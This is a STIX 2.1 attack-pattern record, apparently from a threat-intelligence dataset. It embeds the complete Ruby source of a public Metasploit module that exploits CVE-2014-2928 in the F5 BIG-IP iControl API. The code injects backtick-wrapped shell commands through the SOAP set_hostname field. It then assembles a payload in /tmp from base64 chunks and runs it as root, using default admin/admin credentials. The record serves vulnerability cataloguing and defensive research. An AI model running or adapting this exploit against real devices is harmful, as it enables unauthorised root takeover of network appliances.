{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f5210d03-7903-47fd-be1e-78fa4d5bd23a",
    "created": "2024-08-14T17:01:56.89324Z",
    "modified": "2024-08-14T17:01:56.893244Z",
    "name": "\"F5 iControl Remote Root Command Execution\"",
    "description": " This module exploits an authenticated remote command execution vulnerability in the F5 BIGIP iControl API (and likely other F5 devices).  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/f5_icontrol_exec.rb",
            "external_id": "f5_icontrol_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-2928"
        },
        {
            "source_name": "reference",
            "url": "http://support.f5.com/kb/en-us/solutions/public/15000/200/sol15220.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"F5 iControl Remote Root Command Execution\",\n      'Description'    => %q{\n        This module exploits an authenticated remote command execution\n        vulnerability in the F5 BIGIP iControl API (and likely other\n        F5 devices).\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'bperry' # Discovery, Metasploit module\n        ],\n      'References'     =>\n        [\n          ['CVE', '2014-2928'],\n          ['URL', 'http://support.f5.com/kb/en-us/solutions/public/15000/200/sol15220.html']\n        ],\n      'Platform'       => ['unix'],\n      'Arch'           => ARCH_CMD,\n      'Targets'        =>\n        [\n          ['F5 iControl', {}]\n        ],\n      'Privileged'     => true,\n      'DisclosureDate' => '2013-09-17',\n      'DefaultTarget'  => 0))\n\n      register_options(\n        [\n          Opt::RPORT(443),\n          OptBool.new('SSL', [true, 'Use SSL', true]),\n          OptString.new('TARGETURI', [true, 'The base path to the iControl installation', '/']),\n          OptString.new('HttpUsername', [true, 'The username to authenticate with', 'admin']),\n          OptString.new('HttpPassword', [true, 'The password to authenticate with', 'admin'])\n        ])\n  end\n\n  def check\n    get_hostname = %Q{<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n    <SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\">\n    <SOAP-ENV:Body>\n    <n1:get_hostname xmlns:n1=\"urn:iControl:System/Inet\" />\n    </SOAP-ENV:Body>\n    </SOAP-ENV:Envelope>\n    }\n\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'iControl', 'iControlPortal.cgi'),\n      'method' => 'POST',\n      'data' => get_hostname,\n      'username' => datastore['HttpUsername'],\n      'password' => datastore['HttpPassword']\n    })\n\n    res.body =~ /y:string\">(.*)<\\/return/\n    hostname = $1\n    send_cmd(\"whoami\")\n\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'iControl', 'iControlPortal.cgi'),\n      'method' => 'POST',\n      'data' => get_hostname,\n      'username' => datastore['HttpUsername'],\n      'password' => datastore['HttpPassword']\n    })\n\n    res.body =~ /y:string\">(.*)<\\/return/\n    new_hostname = $1\n\n    if new_hostname == \"root.a.b\"\n      pay = %Q{<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n        <SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\">\n        <SOAP-ENV:Body>\n        <n1:set_hostname xmlns:n1=\"urn:iControl:System/Inet\">\n        <hostname>#{hostname}</hostname>\n        </n1:set_hostname>\n        </SOAP-ENV:Body>\n        </SOAP-ENV:Envelope>\n      }\n\n      send_request_cgi({\n        'uri' => normalize_uri(target_uri.path, 'iControl', 'iControlPortal.cgi'),\n        'method' => 'POST',\n        'data' => pay,\n        'username' => datastore['HttpUsername'],\n        'password' => datastore['HttpPassword']\n      })\n\n      return Exploit::CheckCode::Vulnerable\n    end\n\n    return Exploit::CheckCode::Safe\n  end\n\n  def send_cmd(cmd)\n    pay = %Q{<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n      <SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\">\n      <SOAP-ENV:Body>\n      <n1:set_hostname xmlns:n1=\"urn:iControl:System/Inet\">\n        <hostname>`#{cmd}`.a.b</hostname>\n        </n1:set_hostname>\n        </SOAP-ENV:Body>\n        </SOAP-ENV:Envelope>\n    }\n\n    send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'iControl', 'iControlPortal.cgi'),\n      'method' => 'POST',\n      'data' => pay,\n      'username' => datastore['HttpUsername'],\n      'password' => datastore['HttpPassword']\n    })\n  end\n\n  def exploit\n    filename = Rex::Text.rand_text_alpha_lower(5)\n\n    print_status('Sending payload in chunks, might take a small bit...')\n    i = 0\n    while i < payload.encoded.length\n      cmd = \"echo #{Rex::Text.encode_base64(payload.encoded[i..i+4])}|base64 --decode|tee -a /tmp/#{filename}\"\n      send_cmd(cmd)\n      i = i + 5\n    end\n\n    print_status('Triggering payload...')\n\n    send_cmd(\"sh /tmp/#{filename}\")\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-09-17",
    "x_mitre_platforms": [
        "['unix']"
    ]
}